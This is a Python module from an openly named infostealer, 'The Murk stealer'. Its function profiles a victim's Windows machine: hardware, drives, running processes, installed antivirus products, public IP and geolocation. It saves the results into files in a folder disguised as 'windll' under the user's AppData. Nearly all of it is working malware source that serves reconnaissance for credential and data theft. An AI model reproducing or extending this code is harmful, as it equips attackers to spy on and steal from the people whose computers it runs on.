#-----------------------------------------------------------------------------#
#       ████████╗██╗░░██╗███████╗  ███╗░░░███╗██╗░░░██╗██████╗░██╗░░██╗       #
#       ╚══██╔══╝██║░░██║██╔════╝  ████╗░████║██║░░░██║██╔══██╗██║░██╔╝       #
#       ░░░██║░░░███████║█████╗░░  ██╔████╔██║██║░░░██║██████╔╝█████═╝░       #
#       ░░░██║░░░██╔══██║██╔══╝░░  ██║╚██╔╝██║██║░░░██║██╔══██╗██╔═██╗░       #
#       ░░░██║░░░██║░░██║███████╗  ██║░╚═╝░██║╚██████╔╝██║░░██║██║░╚██╗       #
#       ░░░╚═╝░░░╚═╝░░╚═╝╚══════╝  ╚═╝░░░░░╚═╝░╚═════╝░╚═╝░░╚═╝╚═╝░░╚═╝       #
#                             by: Nick_Vinesmoke                              #
#                      https://github.com/Nick-Vinesmoke                      #
#             https://github.com/Nick-Vinesmoke/The-Murk-stealer              #
#-----------------------------------------------------------------------------#
import psutil
import GPUtil
import json
import platform
import os
import win32api
import time
import requests
from win32com.client import GetObject
"""
logo
"""

logo = '''
|-----------------------------------------------------------------------------|
|       ████████╗██╗░░██╗███████╗  ███╗░░░███╗██╗░░░██╗██████╗░██╗░░██╗       |
|       ╚══██╔══╝██║░░██║██╔════╝  ████╗░████║██║░░░██║██╔══██╗██║░██╔╝       |
|       ░░░██║░░░███████║█████╗░░  ██╔████╔██║██║░░░██║██████╔╝█████═╝░       |
|       ░░░██║░░░██╔══██║██╔══╝░░  ██║╚██╔╝██║██║░░░██║██╔══██╗██╔═██╗░       |
|       ░░░██║░░░██║░░██║███████╗  ██║░╚═╝░██║╚██████╔╝██║░░██║██║░╚██╗       |
|       ░░░╚═╝░░░╚═╝░░╚═╝╚══════╝  ╚═╝░░░░░╚═╝░╚═════╝░╚═╝░░╚═╝╚═╝░░╚═╝       |
|                             by: Nick_Vinesmoke                              |
|                      https://github.com/Nick-Vinesmoke                      |
|             https://github.com/Nick-Vinesmoke/The-Murk-stealer              |
|-----------------------------------------------------------------------------|
'''
def SystemInfo():
    try:
        pathtofolder = os.environ['USERPROFILE'] + os.sep + r'AppData\Local'
        def get_size(bytes, suffix="B"):
            factor = 1024
            for unit in ["", "K", "M", "G", "T", "P"]:
                if bytes < factor:
                    return f"{bytes:.2f}{unit}{suffix}"
                bytes /= factor

        uname = platform.uname()

        namepc = "\nPc name: " + str(uname.node)# get ps name
        countofcpu = psutil.cpu_count(logical=True)# get cpu
        allcpucount = "\nnumber of CPU cores:" + str(countofcpu) # get number of CPU cores

        cpufreq = psutil.cpu_freq()
        cpufreqincy = "\nCPU frequency: " + str(cpufreq.max) + 'Mhz'# get CPU frequency


        svmem = psutil.virtual_memory()
        allram = "\nTotal RAM: " + str(get_size(svmem.total))# get Total RAM
        ramfree = "\nAvailable: " + str(get_size(svmem.available))# get Available RAM
        ramuseg = "\nUsed: " + str(get_size(svmem.used))# get Used RAM







        partitions = psutil.disk_partitions()
        for partition in partitions:
            nameofdevice = "\nDrive: " + str(partition.device)# get Drives
            nameofdick = "\nDrive volume: " + str(partition.mountpoint)# get Drive volume
            typeoffilesystem = "\nFile system type: " + str(partition.fstype)# File system type
            try:
                partition_usage = psutil.disk_usage(partition.mountpoint)
            except PermissionError:

                continue
            allstorage = "\nTotal memory: " + str(get_size(partition_usage.total))# get Total memory
            usedstorage = "\nUsed: " + str(get_size(partition_usage.used))# get Used
            freestorage = "\nAvailable: " + str(get_size(partition_usage.free))# get Total Available



        try:
            gpus = GPUtil.getGPUs()
            list_gpus = []
            for gpu in gpus:

                gpu_name = "\nType of GPU: " + gpu.name# get Type of GPU

                gpu_free_memory = "\nAvailable GPU memory: " + f"{gpu.memoryFree}MB"# get Available GPU memory

                gpu_total_memory = "\nTotal GPU memory: " f"{gpu.memoryTotal}MB"# get Total GPU memory

                gpu_temperature = "\nGPU temperature: " f"{gpu.temperature} °C"# get GPU temperature
        except:
            print('No GPU')

        """
        all needed paths
        """
        Antiviruses = {
            'C:\\Program Files\\Windows Defender': 'Windows Defender',
            'C:\\Program Files\\AVAST Software\\Avast': 'Avast',
            'C:\\Program Files\\AVG\\Antivirus': 'AVG',
            'C:\\Program Files (x86)\\Avira\\Launcher': 'Avira',
            'C:\\Program Files (x86)\\IObit\\Advanced SystemCare': 'Advanced SystemCare',
            'C:\\Program Files\\Bitdefender Antivirus Free': 'Bitdefender',
            'C:\\Program Files\\DrWeb': 'Dr.Web',
            'C:\\Program Files\\ESET\\ESET Security': 'ESET',
            'C:\\Program Files (x86)\\Kaspersky Lab': 'Kaspersky Lab',
            'C:\\Program Files (x86)\\360\\Total Security': '360 Total Security',
            'C:\\Program Files\\ESET\\ESET NOD32 Antivirus': 'ESET NOD32',
            'C:\\Program Files\\Malwarebytes\\Anti-Malware': 'Malwarebytes'
            }


        Antivirus = [Antiviruses[d] for d in filter(os.path.exists, Antiviruses)]
        Antiviruses = json.dumps(Antivirus)

        headers = {
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
            'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:64.0) Gecko/20100101 Firefox/64.0'
        }
        drives = str(win32api.GetLogicalDriveStrings())
        drives = str(drives.split('\000')[:-1])

        try:
            ip = requests.get('https://api.ipify.org').text
            urlloc = 'http://ip-api.com/json/'+ip
            location1 = requests.get(urlloc, headers=headers).text
        except Exception as e:
            print(e)
        try:
            all_data = "Time: " + time.asctime() + '\n' + "CPU: " + platform.processor() + '\n' + "OS type: " + platform.system() + ' ' + platform.release() + '\nLocation and IP:' + location1 + '\nDrives:' + drives + str(namepc) + str(allcpucount) + str(cpufreq) + str(cpufreqincy) + str(svmem) + str(allram) + str(ramfree) + str(ramuseg) + str(nameofdevice) + str(nameofdick) + str(typeoffilesystem )+ str(allstorage) + str(usedstorage) + str(freestorage)
            file = open(rf'{pathtofolder}\windll\System\PC_info.txt', "w+", encoding='utf-8') 
            file.write(logo)
            file.write(all_data)
            file.write('\nAntiviruses: '+str(Antiviruses))
        except Exception as e:
            print(e)
        try:
            file.write(str(gpu_name) + str(gpu_free_memory) + str(gpu_total_memory) + str(gpu_temperature))
        except:
            pass

        file.close()
        fileproc = open(rf'{pathtofolder}\windll\System\Processes.txt', 'a', encoding='utf-8')
        result = [process.Properties_('Name').Value for process in GetObject('winmgmts:').InstancesOf('Win32_Process')]
        fileproc.write("\n".join(process for process in result))
        fileproc.close()
    except Exception as e:
        print(e)

